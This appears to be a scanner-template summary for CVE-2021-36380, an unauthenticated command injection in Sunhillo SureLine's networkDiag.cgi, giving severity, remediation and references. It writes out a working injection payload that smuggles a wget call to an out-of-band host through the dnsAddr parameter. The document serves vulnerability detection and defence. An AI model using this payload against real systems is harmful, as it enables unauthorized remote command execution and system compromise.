---
cve_id: CVE-2021-36380
template_path: nuclei-templates/http/cves/2021/CVE-2021-36380.yaml
affected_product: Sunhillo SureLine
severity: critical
authentication: none
external_callback: true
affected_versions: <8.7.0.1.1
preconditions: []
poc_classification: rce
---

## Vulnerability
Sunhillo SureLine <8.7.0.1.1 is vulnerable to unauthenticated OS command injection via the `/cgi/networkDiag.cgi` script. User-controllable parameters (e.g. `dnsAddr`) are directly embedded into a shell command without sanitization, enabling arbitrary OS command execution including reverse TCP shells.

Impact: remote attackers can achieve full system compromise (arbitrary command execution on the target).

CVSS: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  
CWE-78: Improper Neutralization of Special Elements used in an OS Command.

Remediation: upgrade to Sunhillo SureLine 8.7.0.1.1 or later.

## PoC / Detection
Classification: rce

The template sends a single raw POST request to `/cgi/networkDiag.cgi` containing the injection payload `dnsAddr=$(wget+http://{{interactsh-url}})` (with `command=2`). If vulnerable, the server executes the injected `wget` and triggers an out-of-band HTTP callback. The matcher confirms exploitation by checking `interactsh_protocol: http`.

## References
- https://research.nccgroup.com/2021/07/26/technical-advisory-sunhillo-sureline-unauthenticated-os-command-injection-cve-2021-36380/
- https://nvd.nist.gov/vuln/detail/CVE-2021-36380
- https://www.sunhillo.com/product/sureline/
- https://github.com/Ostorlab/KEV
- https://github.com/fkie-cad/nvd-json-data-feeds
